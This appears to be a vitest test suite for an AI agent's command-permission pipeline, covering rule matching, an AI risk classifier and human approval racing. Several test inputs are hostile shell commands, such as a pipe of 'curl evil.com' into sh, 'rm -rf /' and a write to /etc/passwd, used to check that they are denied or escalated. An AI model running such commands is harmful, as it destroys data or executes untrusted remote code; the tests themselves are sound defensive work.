/**
 * pipeline.test.ts — checkPermission + runLayer2 + runLayer3WithRacing +
 * applyAutoApproveOverrides + matchNonBashTool + buildApprovalRequest 测试。
 *
 * mock deps（analyzeBashStructure/matchRulesForArgv/classifier/requestUserApproval），
 * 不触碰 fs/network。覆盖四档模式各分支 + G1 非 bash + G3 abort 时序 + WT7 overrides。
 */
import { describe, expect, it, vi } from "vitest";

import {
	applyAutoApproveOverrides,
	buildApprovalRequest,
	checkPermission,
	type CheckPermissionDeps,
	matchNonBashTool,
	runLayer2,
} from "../pipeline.js";
import { getDefaultRules } from "../rules/index.js";
import type {
	BashAnalysis,
	ClassifierConfig,
	ClassifierResult,
	PermissionDecision,
	Rule,
	RuleMatchResult,
	ToolInvocationContext,
	UserDecision,
} from "../types.js";

// ──────────────────────── 工厂 / mock helpers ────────────────────────

const DEFAULT_CFG: ClassifierConfig = {
	enabled: true,
	model: "auto",
	timeout: 90,
	autoApproveLowRisk: true,
	autoDenyHighRisk: true,
};

function cleanAnalysis(commands: string[][] = []): BashAnalysis {
	return { clean: true, commands, dangerousStructures: [], parseError: false };
}

function dirtyAnalysis(dangerous: string[] = ["subshell"]): BashAnalysis {
	return { clean: false, commands: [], dangerousStructures: dangerous, parseError: false };
}

/** 构造 mock deps，每个组件可覆写行为。 */
function makeDeps(overrides: {
	analyze?: (cmd: string) => Promise<BashAnalysis>;
	matchArgv?: (argv: string[], rules: readonly Rule[]) => RuleMatchResult;
	rules?: () => Rule[];
	classify?: (ctx: ToolInvocationContext, cfg: ClassifierConfig, signal?: AbortSignal) => Promise<ClassifierResult>;
	approve?: (req: { toolName: string; command?: string; reason: string }, ctx: ToolInvocationContext, signal?: AbortSignal) => Promise<UserDecision>;
} = {}): CheckPermissionDeps {
	return {
		analyzeBashStructure: overrides.analyze ?? (() => Promise.resolve(cleanAnalysis())),
		matchRulesForArgv:
			overrides.matchArgv ?? (() => ({ action: "ask", matchedRule: undefined })),
		getDefaultRules: overrides.rules ?? (() => getDefaultRules()),
		classifier: {
			classifyRisk: overrides.classify ?? (() => Promise.resolve(fallbackClassifier())),
		},
		requestUserApproval:
			overrides.approve ?? (() => Promise.resolve({ approved: false, reason: "default-deny" })),
	};
}

function fallbackClassifier(): ClassifierResult {
	return { risk_level: "medium", outcome: "ask", reasoning: "fallback", confidence: 0 };
}

function allowClassifier(risk: "low" | "medium" | "high" = "low"): ClassifierResult {
	return { risk_level: risk, outcome: "allow", reasoning: "ai-allow", confidence: 0.9 };
}

function denyClassifier(risk: "low" | "medium" | "high" = "high"): ClassifierResult {
	return { risk_level: risk, outcome: "deny", reasoning: "ai-deny", confidence: 0.95 };
}

const ctxBase = { cwd: "/tmp", agentName: "test" };

// ──────────────────────── yolo 模式 ────────────────────────

describe("checkPermission: yolo 模式", () => {
	it("yolo 完全放行，不跑任何层（source=mode）", async () => {
		const analyze = vi.fn(() => Promise.resolve(cleanAnalysis()));
		const deps = makeDeps({ analyze });
		const decision = await checkPermission(
			"bash",
			{ command: "rm -rf /" },
			"yolo",
			DEFAULT_CFG,
			[],
			deps,
			ctxBase,
		);
		expect(decision).toEqual<PermissionDecision>({
			action: "allow",
			reason: "yolo mode: all tools allowed",
			source: "mode",
		});
		expect(analyze).not.toHaveBeenCalled(); // 快速路径不跑 AST
	});

	it("yolo 对非 bash 工具也放行", async () => {
		const deps = makeDeps();
		const decision = await checkPermission(
			"write",
			{ path: "/etc/passwd" },
			"yolo",
			DEFAULT_CFG,
			[],
			deps,
			ctxBase,
		);
		expect(decision.action).toBe("allow");
		expect(decision.source).toBe("mode");
	});
});

// ──────────────────────── strict 模式 ────────────────────────

describe("checkPermission: strict 模式", () => {
	it("strict 全部人工审批，不跑 AST/规则/AI", async () => {
		const analyze = vi.fn(() => Promise.resolve(cleanAnalysis()));
		const approve = vi.fn(() =>
			Promise.resolve<UserDecision>({ approved: true, reason: "ok" }),
		);
		const deps = makeDeps({ analyze, approve });
		const decision = await checkPermission(
			"bash",
			{ command: "ls" },
			"strict",
			DEFAULT_CFG,
			[],
			deps,
			ctxBase,
		);
		expect(decision.action).toBe("allow");
		expect(decision.source).toBe("user");
		expect(analyze).not.toHaveBeenCalled(); // strict 不跑 AST
		expect(approve).toHaveBeenCalledOnce();
	});

	it("strict 用户拒绝 → deny", async () => {
		const deps = makeDeps({
			approve: () => Promise.resolve<UserDecision>({ approved: false, reason: "no" }),
		});
		const decision = await checkPermission("read", { path: "/x" }, "strict", DEFAULT_CFG, [], deps, ctxBase);
		expect(decision.action).toBe("deny");
		expect(decision.source).toBe("user");
	});
});

// ──────────────────────── approve 模式 ────────────────────────

describe("checkPermission: approve 模式（无 AI）", () => {
	it("approve + 规则 allow → 放行（source=rule）", async () => {
		const deps = makeDeps({
			analyze: () => Promise.resolve(cleanAnalysis([["ls"]])),
			matchArgv: () => ({ action: "allow", matchedRule: undefined }),
		});
		const decision = await checkPermission("bash", { command: "ls" }, "approve", DEFAULT_CFG, [], deps, ctxBase);
		expect(decision.action).toBe("allow");
		expect(decision.source).toBe("rule");
	});

	it("approve + 规则 deny → 拒绝（source=rule）", async () => {
		const denyRule: Rule = { id: "t1", tool: "bash", pattern: "rm", action: "deny", source: "user" };
		const deps = makeDeps({
			analyze: () => Promise.resolve(cleanAnalysis([["rm", "-rf"]])),
			matchArgv: (_argv, _rules) => ({ action: "deny", matchedRule: denyRule }),
		});
		const decision = await checkPermission("bash", { command: "rm -rf" }, "approve", DEFAULT_CFG, [], deps, ctxBase);
		expect(decision.action).toBe("deny");
		expect(decision.source).toBe("rule");
		expect(decision.matchedRule?.id).toBe("t1");
	});

	it("approve + 规则 ask → 人工审批（不跑 AI）", async () => {
		const classify = vi.fn(() => Promise.resolve(allowClassifier()));
		const approve = vi.fn(() =>
			Promise.resolve<UserDecision>({ approved: true, reason: "ok" }),
		);
		const deps = makeDeps({
			analyze: () => Promise.resolve(cleanAnalysis([["rm", "-rf"]])),
			matchArgv: () => ({ action: "ask", matchedRule: undefined }),
			classify,
			approve,
		});
		const decision = await checkPermission("bash", { command: "rm -rf" }, "approve", DEFAULT_CFG, [], deps, ctxBase);
		expect(decision.action).toBe("allow");
		expect(decision.source).toBe("user");
		expect(classify).not.toHaveBeenCalled(); // approve 不跑 AI
		expect(approve).toHaveBeenCalledOnce();
	});

	it("approve + AST 危险结构 → 人工审批", async () => {
		const approve = vi.fn(() =>
			Promise.resolve<UserDecision>({ approved: false, reason: "no" }),
		);
		const deps = makeDeps({
			analyze: () => Promise.resolve(dirtyAnalysis(["subshell"])),
			approve,
		});
		const decision = await checkPermission("bash", { command: "$(rm -rf)" }, "approve", DEFAULT_CFG, [], deps, ctxBase);
		expect(decision.action).toBe("deny");
		expect(decision.source).toBe("user");
		expect(approve).toHaveBeenCalledOnce();
	});

	it("approve + 非 bash G1 规则 allow → 放行", async () => {
		const allowRule: Rule = { id: "u1", tool: "read", pattern: "*", action: "allow", source: "user" };
		const deps = makeDeps({ rules: () => [allowRule] });
		const decision = await checkPermission("read", { path: "/x" }, "approve", DEFAULT_CFG, [], deps, ctxBase);
		expect(decision.action).toBe("allow");
		expect(decision.source).toBe("rule");
	});
});

// ──────────────────────── auto 模式 ────────────────────────

describe("checkPermission: auto 模式（AST + 规则 + AI Racing）", () => {
	it("auto + 规则 allow → 放行（不跑 AI）", async () => {
		const classify = vi.fn(() => Promise.resolve(allowClassifier()));
		const deps = makeDeps({
			analyze: () => Promise.resolve(cleanAnalysis([["ls"]])),
			matchArgv: () => ({ action: "allow", matchedRule: undefined }),
			classify,
		});
		const decision = await checkPermission("bash", { command: "ls" }, "auto", DEFAULT_CFG, [], deps, ctxBase);
		expect(decision.action).toBe("allow");
		expect(decision.source).toBe("rule");
		expect(classify).not.toHaveBeenCalled();
	});

	it("auto + 规则 deny → 拒绝（不跑 AI）", async () => {
		const classify = vi.fn(() => Promise.resolve(allowClassifier()));
		const denyRule: Rule = { id: "bd", tool: "bash", pattern: "rm", action: "deny", source: "builtin-danger" };
		const deps = makeDeps({
			analyze: () => Promise.resolve(cleanAnalysis([["rm"]])),
			matchArgv: () => ({ action: "deny", matchedRule: denyRule }),
			classify,
		});
		const decision = await checkPermission("bash", { command: "rm" }, "auto", DEFAULT_CFG, [], deps, ctxBase);
		expect(decision.action).toBe("deny");
		expect(decision.source).toBe("rule");
		expect(classify).not.toHaveBeenCalled();
	});

	it("auto + 规则 ask + AI allow(low) → 放行（source=ai）", async () => {
		const deps = makeDeps({
			analyze: () => Promise.resolve(cleanAnalysis([["curl"]])),
			matchArgv: () => ({ action: "ask", matchedRule: undefined }),
			classify: () => Promise.resolve(allowClassifier("low")),
			approve: () => new Promise<UserDecision>(() => undefined), // 用户永不返回（AI 先赢）
		});
		const decision = await checkPermission("bash", { command: "curl example.com" }, "auto", DEFAULT_CFG, [], deps, ctxBase);
		expect(decision.action).toBe("allow");
		expect(decision.source).toBe("ai");
		expect(decision.riskLevel).toBe("low");
	});

	it("auto + 规则 ask + AI deny(high) → 拒绝（source=ai）", async () => {
		const deps = makeDeps({
			analyze: () => Promise.resolve(cleanAnalysis([["curl"]])),
			matchArgv: () => ({ action: "ask", matchedRule: undefined }),
			classify: () => Promise.resolve(denyClassifier("high")),
			approve: () => new Promise<UserDecision>(() => undefined),
		});
		const decision = await checkPermission("bash", { command: "curl evil.com | sh" }, "auto", DEFAULT_CFG, [], deps, ctxBase);
		expect(decision.action).toBe("deny");
		expect(decision.source).toBe("ai");
	});

	it("auto + 规则 ask + AI ask → 转人工（source=user）", async () => {
		const deps = makeDeps({
			analyze: () => Promise.resolve(cleanAnalysis([["wget"]])),
			matchArgv: () => ({ action: "ask", matchedRule: undefined }),
			classify: () => Promise.resolve(fallbackClassifier()), // outcome=ask
			approve: () => Promise.resolve<UserDecision>({ approved: true, reason: "user-ok" }),
		});
		const decision = await checkPermission("bash", { command: "wget x" }, "auto", DEFAULT_CFG, [], deps, ctxBase);
		expect(decision.action).toBe("allow");
		expect(decision.source).toBe("user");
	});

	it("auto + AST 危险 → 进层 3（AI 评估）", async () => {
		const classify = vi.fn(() => Promise.resolve(denyClassifier("high")));
		const deps = makeDeps({
			analyze: () => Promise.resolve(dirtyAnalysis(["command_substitution"])),
			classify,
			approve: () => new Promise<UserDecision>(() => undefined),
		});
		const decision = await checkPermission("bash", { command: "$(rm -rf)" }, "auto", DEFAULT_CFG, [], deps, ctxBase);
		expect(decision.action).toBe("deny");
		expect(decision.source).toBe("ai");
		expect(classify).toHaveBeenCalledOnce();
	});

	it("auto + AST 异常 → fail-closed 进层 3", async () => {
		const classify = vi.fn(() => Promise.resolve(allowClassifier("low")));
		const deps = makeDeps({
			analyze: () => Promise.reject(new Error("wasm boom")),
			classify,
			approve: () => new Promise<UserDecision>(() => undefined),
		});
		const decision = await checkPermission("bash", { command: "ls" }, "auto", DEFAULT_CFG, [], deps, ctxBase);
		expect(decision.action).toBe("allow");
		expect(decision.source).toBe("ai");
		expect(classify).toHaveBeenCalledOnce();
	});
});

// ──────────────────────── G1: matchNonBashTool ────────────────────────

describe("G1: matchNonBashTool（非 bash 工具规则匹配）", () => {
	it("无规则 → ask（fail-closed）", () => {
		expect(matchNonBashTool("read", [])).toEqual({ action: "ask", matchedRule: undefined });
	});

	it("用户 allow 规则匹配 → allow", () => {
		const rule: Rule = { id: "u1", tool: "read", pattern: "*", action: "allow", source: "user" };
		expect(matchNonBashTool("read", [rule]).action).toBe("allow");
	});

	it("用户 deny 规则匹配 → deny", () => {
		const rule: Rule = { id: "u1", tool: "write", pattern: "*secret*", action: "deny", source: "user" };
		// pattern 'secret*' 匹配 'secret'（非 bash 工具的 pattern 对 toolName 匹配，但 toolName='write' 不含 secret）
		// 这里测 tool 字段不匹配的情况 → ask
		expect(matchNonBashTool("write", [rule]).action).toBe("ask");
	});

	it("tool='*' 通配匹配所有工具", () => {
		const rule: Rule = { id: "u1", tool: "*", pattern: "*", action: "allow", source: "user" };
		expect(matchNonBashTool("read", [rule]).action).toBe("allow");
		expect(matchNonBashTool("write", [rule]).action).toBe("allow");
		expect(matchNonBashTool("edit", [rule]).action).toBe("allow");
	});

	it("last-match-wins（后一条覆盖前一条）", () => {
		const allow: Rule = { id: "a", tool: "read", pattern: "*", action: "allow", source: "user" };
		const deny: Rule = { id: "d", tool: "read", pattern: "*", action: "deny", source: "user" };
		expect(matchNonBashTool("read", [allow, deny]).action).toBe("deny");
		expect(matchNonBashTool("read", [deny, allow]).action).toBe("allow");
	});

	it("空 toolName → ask", () => {
		expect(matchNonBashTool("", [])).toEqual({ action: "ask", matchedRule: undefined });
	});
});

// ──────────────────────── runLayer2 ────────────────────────

describe("runLayer2（层 2 编排）", () => {
	const allowArgv = (): RuleMatchResult => ({ action: "allow", matchedRule: undefined });
	const denyArgv = (): RuleMatchResult => ({ action: "deny", matchedRule: undefined });
	const askArgv = (): RuleMatchResult => ({ action: "ask", matchedRule: undefined });

	it("非 bash → 走 matchNonBashTool", () => {
		const r = runLayer2("read", [], [], allowArgv);
		expect(r.action).toBe("ask"); // 无规则
	});

	it("bash 空 argvList → ask", () => {
		expect(runLayer2("bash", [], [], allowArgv).action).toBe("ask");
	});

	it("bash 全 allow → allow", () => {
		expect(runLayer2("bash", [["ls"], ["pwd"]], [], allowArgv).action).toBe("allow");
	});

	it("bash 任一 deny → deny", () => {
		const match = (argv: string[]): RuleMatchResult =>
			argv[0] === "rm" ? denyArgv() : allowArgv();
		expect(runLayer2("bash", [["ls"], ["rm"]], [], match).action).toBe("deny");
	});

	it("bash 混合 allow+ask → ask", () => {
		const match = (argv: string[]): RuleMatchResult =>
			argv[0] === "curl" ? askArgv() : allowArgv();
		expect(runLayer2("bash", [["ls"], ["curl"]], [], match).action).toBe("ask");
	});

	it("bash 空 argv 跳过 → 视为 ask", () => {
		expect(runLayer2("bash", [[]], [], allowArgv).action).toBe("ask");
	});
});

// ──────────────────────── applyAutoApproveOverrides（WT7） ────────────────────────

describe("applyAutoApproveOverrides（WT7 偏差补丁）", () => {
	it("low+allow+autoApproveLowRisk=true → 透传 allow", () => {
		const r = applyAutoApproveOverrides(allowClassifier("low"), DEFAULT_CFG);
		expect(r.outcome).toBe("allow");
	});

	it("low+allow+autoApproveLowRisk=false → ask", () => {
		const cfg = { ...DEFAULT_CFG, autoApproveLowRisk: false };
		const r = applyAutoApproveOverrides(allowClassifier("low"), cfg);
		expect(r.outcome).toBe("ask");
		expect(r.reasoning).toContain("auto-ask");
	});

	it("high+allow+autoDenyHighRisk=true → deny", () => {
		const r = applyAutoApproveOverrides(allowClassifier("high"), DEFAULT_CFG);
		expect(r.outcome).toBe("deny");
		expect(r.reasoning).toContain("auto-denied");
	});

	it("high+allow+autoDenyHighRisk=false → 透传 allow", () => {
		const cfg = { ...DEFAULT_CFG, autoDenyHighRisk: false };
		const r = applyAutoApproveOverrides(allowClassifier("high"), cfg);
		expect(r.outcome).toBe("allow");
	});

	it("deny 透传（不触发 autoDeny，避免与 AI deny 冲突）", () => {
		const r = applyAutoApproveOverrides(denyClassifier("high"), DEFAULT_CFG);
		expect(r.outcome).toBe("deny");
		expect(r.reasoning).toBe("ai-deny"); // 原样
	});

	it("ask 透传", () => {
		const r = applyAutoApproveOverrides(fallbackClassifier(), DEFAULT_CFG);
		expect(r.outcome).toBe("ask");
	});

	it("不修改原对象（不可变）", () => {
		const orig = allowClassifier("low");
		const cfg = { ...DEFAULT_CFG, autoApproveLowRisk: false };
		applyAutoApproveOverrides(orig, cfg);
		expect(orig.outcome).toBe("allow"); // 原对象未变
	});
});

// ──────────────────────── buildApprovalRequest ────────────────────────

describe("buildApprovalRequest", () => {
	it("bash 命令包含在 reason 里", () => {
		const req = buildApprovalRequest("bash", "rm -rf /", "dangerous");
		expect(req.toolName).toBe("bash");
		expect(req.command).toBe("rm -rf /");
		expect(req.reason).toContain("rm -rf /");
		expect(req.reason).toContain("dangerous");
	});

	it("非 bash 无 command 部分", () => {
		const req = buildApprovalRequest("read", undefined, "no rule");
		expect(req.command).toBeUndefined();
		// 非 bash 无 command → reason 不含 ': <command>' 片段
		expect(req.reason).toBe("[read] no rule");
		expect(req.reason).toContain("read");
	});

	it("携带 preClassification", () => {
		const pc = allowClassifier("low");
		const req = buildApprovalRequest("bash", "curl", "ask", pc);
		expect(req.preClassification).toBe(pc);
	});
});

// ──────────────────────── G3: runLayer3WithRacing abort 时序 ────────────────────────

describe("G3: runLayer3WithRacing abort 时序", () => {
	it("用户先返回 → 取消 AI（controller.abort 传播）", async () => {
		let aiSignalAborted = false;
		const deps = makeDeps({
			classify: (_ctx, _cfg, signal) =>
				new Promise<ClassifierResult>((resolve) => {
					// AI 永不主动 resolve（模拟慢），监听 abort
					signal?.addEventListener("abort", () => {
						aiSignalAborted = true;
						resolve(fallbackClassifier());
					});
				}),
			approve: () => Promise.resolve<UserDecision>({ approved: true, reason: "user-first" }),
		});
		const { runLayer3WithRacing } = await import("../pipeline.js");
		const decision = await runLayer3WithRacing(deps, { toolName: "bash", command: "x", cwd: "/tmp" }, DEFAULT_CFG, undefined);
		expect(decision.action).toBe("allow");
		expect(decision.source).toBe("user");
		// AI 的 signal 被abort（用户先返回触发）
		// 注：approve 同步 resolve 后，race 立即settled，abort 在 microtask 后传播
		expect(aiSignalAborted).toBe(true);
	});

	it("外层 signal 已 aborted → AI 立即收到 abort", async () => {
		const controller = new AbortController();
		controller.abort();
		let aiSawAborted = false;
		const deps = makeDeps({
			classify: (_ctx, _cfg, signal) => {
				aiSawAborted = signal?.aborted ?? false;
				// 返回 deny（非 ask），避免 racing 等 user（user 永不返回会 hang）
				return Promise.resolve(denyClassifier("high"));
			},
			approve: () => new Promise<UserDecision>(() => undefined),
		});
		const { runLayer3WithRacing } = await import("../pipeline.js");
		const decision = await runLayer3WithRacing(deps, { toolName: "bash", command: "x", cwd: "/tmp" }, DEFAULT_CFG, controller.signal);
		expect(aiSawAborted).toBe(true);
		expect(decision.action).toBe("deny");
	});
});

// ──────────────────────── W6 T6: applyAutoApproveOverrides 集成路径 ────────────────────────

describe("W6 T6: applyAutoApproveOverrides 在 auto 模式的偏差补丁路径", () => {
	it("low+allow+autoApproveLowRisk=false → ask → 转人工审批", async () => {
		// AI 说 low+allow，但 autoApproveLowRisk=false → override 为 ask → 转人工
		const cfg = { ...DEFAULT_CFG, autoApproveLowRisk: false };
		const approve = vi.fn(() =>
			Promise.resolve<UserDecision>({ approved: true, reason: "user-ok" }),
		);
		const deps = makeDeps({
			analyze: () => Promise.resolve(cleanAnalysis([["curl"]])),
			matchArgv: () => ({ action: "ask", matchedRule: undefined }),
			classify: () => Promise.resolve(allowClassifier("low")), // AI allow low
			approve,
		});
		const decision = await checkPermission("bash", { command: "curl x" }, "auto", cfg, [], deps, ctxBase);
		// override 为 ask → 转人工 → 用户 approve → allow（source=user）
		expect(decision.action).toBe("allow");
		expect(decision.source).toBe("user");
		expect(approve).toHaveBeenCalledOnce();
	});

	it("high+allow+autoDenyHighRisk=true → deny（override 生效，AI 决策胜出）", async () => {
		// AI 说 high+allow，但 autoDenyHighRisk=true → override 为 deny。
		// racing 会启动 approve（realUserPromise），但 AI 先返回 deny 时
		// resolveUser 关闭对话框 + 决策源为 ai。用户 approve mock 永不返回
		// 以确保 AI 赢 race。
		const approve = vi.fn(() => new Promise<UserDecision>(() => undefined));
		const deps = makeDeps({
			analyze: () => Promise.resolve(cleanAnalysis([["curl"]])),
			matchArgv: () => ({ action: "ask", matchedRule: undefined }),
			classify: () => Promise.resolve(allowClassifier("high")), // AI allow high（危险）
			approve,
		});
		const decision = await checkPermission("bash", { command: "curl x" }, "auto", DEFAULT_CFG, [], deps, ctxBase);
		// override 为 deny → source=ai
		expect(decision.action).toBe("deny");
		expect(decision.source).toBe("ai");
		expect(decision.riskLevel).toBe("high");
	});
});

// ──────────────────────── W6 T6 G6: realUserPromise race 必要性 ────────────────────────

describe("W6 T6 G6: runLayer3WithRacing 双 promise（userPromise + realUserPromise）", () => {
	it("AI ask 时 realUserPromise 是最终决策源（userPromise 被 resolveUser 透传）", async () => {
		// AI 返回 ask → 不 resolveUser，等 realUserPromise 最终决策
		// 验证 realUserPromise 是真正驱动 AI-ask 分支完成的 promise
		const deps = makeDeps({
			classify: () => Promise.resolve(fallbackClassifier()), // outcome=ask
			approve: () => Promise.resolve<UserDecision>({ approved: false, reason: "user-denied-after-ask" }),
		});
		const { runLayer3WithRacing } = await import("../pipeline.js");
		const decision = await runLayer3WithRacing(
			deps,
			{ toolName: "bash", command: "x", cwd: "/tmp" },
			DEFAULT_CFG,
			undefined,
		);
		// realUserPromise resolve → 决策源 user，reason 透传
		expect(decision.action).toBe("deny");
		expect(decision.source).toBe("user");
		expect(decision.reason).toContain("user-denied-after-ask");
	});

	it("realUserPromise.then 的 abort 副作用：用户决策后 AI signal 被 abort", async () => {
		// 用户先返回时 realUserPromise.then 调 controller.abort() + resolveUser
		// 验证 AI 的 signal 确实被 abort（F9 结论：双 promise 都需要，
		// realUserPromise 驱动 abort 副作用 + userPromise 驱动 race 透传）
		// 关键：abort 触发 AI resolve 为 ask（非 allow/deny），确保最终决策走 user 分支
		// （无论 race 谁先 settle，AI ask 不改 outcome，user approved=true → allow）
		let aiAborted = false;
		const deps = makeDeps({
			classify: (_ctx, _cfg, signal) =>
				new Promise<ClassifierResult>((resolve) => {
					signal?.addEventListener("abort", () => {
						aiAborted = true;
						resolve(fallbackClassifier()); // outcome=ask，不改 outcome
					});
				}),
			approve: () => Promise.resolve<UserDecision>({ approved: true, reason: "user-fast" }),
		});
		const { runLayer3WithRacing } = await import("../pipeline.js");
		const decision = await runLayer3WithRacing(
			deps,
			{ toolName: "bash", command: "x", cwd: "/tmp" },
			DEFAULT_CFG,
			undefined,
		);
		// 用户 approved=true → allow（无论 AI ask 是否先 settle，最终都走 user 决策）
		expect(decision.action).toBe("allow");
		expect(aiAborted).toBe(true); // realUserPromise.then 的 abort 副作用生效
	});
});
